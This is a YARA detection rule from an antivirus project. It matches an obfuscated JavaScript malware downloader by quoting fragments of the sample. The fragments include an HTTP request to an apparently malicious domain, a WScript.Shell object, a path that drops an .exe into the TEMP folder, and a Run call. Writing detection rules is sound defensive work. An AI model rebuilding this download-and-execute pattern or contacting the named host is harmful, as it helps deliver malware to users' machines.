rule sig_20160401_12da7e07e3fae71488b9c9ced3d7eaa8 {
  meta:
    description = "datamaliciousorder - file 20160401_12da7e07e3fae71488b9c9ced3d7eaa8.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "b5bf483ce5d1939082cf176d7bd63939dec4d6d72c261290f5dd55f929888978"

  strings:
    $s1  = "JzbHx[AycVq](\"G\" + \"ET\", \"http://hotlinehomeappalinces.com/l2osa\", false);" fullword ascii
    $s2  = "var ShNte = function XpXt() {return WScript[UmKs](\"WScript\"+\".Shell\");}(), FhwXfa = 11;" fullword ascii
    $s3  = "function FjRz(QdqHb, ApaRu){HvDor = HvDor * 1; return QdqHb - ApaRu;};" fullword ascii
    $s4  = "if (JzbHx[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function SgXia(){return MtlKci + \"\";};" fullword ascii
    $s6  = "function KadUqm() {return ShNte[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"hMlCLYDhEJ8iyL.ex\" + \"e\";};" fullword ascii
    $s7  = "function IciVgi() {return ((OwvXa == true) && (OwvXa == AlMsm)) ? 1 : HvDor;};" fullword ascii
    $s8  = "function CwJf(XpOm) {var LnZq = (1, 2, 3, 4, 5, XpOm); return LnZq;};" fullword ascii
    $s9  = "var OwvXa = false;" fullword ascii
    $s10 = "}while (YvTj);" fullword ascii
    $s11 = "AlMsm = true; " fullword ascii
    $s12 = "return FjRz(VkpYx, McmYv);" fullword ascii
    $s13 = "OwvXa = true; " fullword ascii
    $s14 = "function WcdRoy(GzLiq){ShNte[\"R\"+\"un\"](GzLiq, HvDor, HvDor);};" fullword ascii
    $s15 = "var AlMsm = false;" fullword ascii
    $s16 = "var EneHnh = false;" fullword ascii
    $s17 = "function KwaVv()" fullword ascii
    $s18 = "function YdQuh(){return 23;};" fullword ascii
    $s19 = "function KdVch(){return UmKs;};" fullword ascii
    $s20 = "} catch(GulAz){};};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}